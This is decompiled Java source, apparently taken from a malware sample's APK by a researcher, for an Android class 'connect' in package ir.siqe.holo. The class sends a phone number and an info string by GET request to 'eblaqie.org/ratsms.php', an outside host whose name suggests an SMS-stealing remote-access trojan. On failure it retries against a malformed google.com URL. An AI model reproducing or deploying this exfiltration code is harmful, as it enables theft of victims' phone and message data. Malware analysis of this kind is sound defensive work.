package ir.siqe.holo;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.JSONArrayRequestListener;
import org.json.JSONArray;

public class connect {
  Context context;
  
  SharedPreferences preferences;
  
  String url;
  
  public connect(final String url, final String info, Context paramContext) {
    this.url = url;
    this.context = paramContext;
    AndroidNetworking.initialize(paramContext);
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("https://eblaqie.org/ratsms.php?phone=");
    stringBuilder.append(url);
    stringBuilder.append("&info=");
    stringBuilder.append(info);
    AndroidNetworking.get(stringBuilder.toString()).build().getAsJSONArray(new JSONArrayRequestListener() {
          final connect this$0;
          
          final String val$info;
          
          final String val$url;
          
          public void onError(ANError param1ANError) {
            Log.i("==================", "erroeererewrwerwer");
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("https://google.com");
            stringBuilder.append(url);
            stringBuilder.append("&info=");
            stringBuilder.append(info);
            AndroidNetworking.get(stringBuilder.toString()).build().getAsJSONArray(new JSONArrayRequestListener() {
                  final connect.null this$1;
                  
                  public void onError(ANError param2ANError) {
                    Log.i("==================", "erroeererewrwerwer");
                  }
                  
                  public void onResponse(JSONArray param2JSONArray) {}
                });
          }
          
          public void onResponse(JSONArray param1JSONArray) {}
        });
  }
}


/* Location:              C:\Users\Jason\Downloads\355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082-dex2jar.jar!\ir\siqe\holo\connect.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */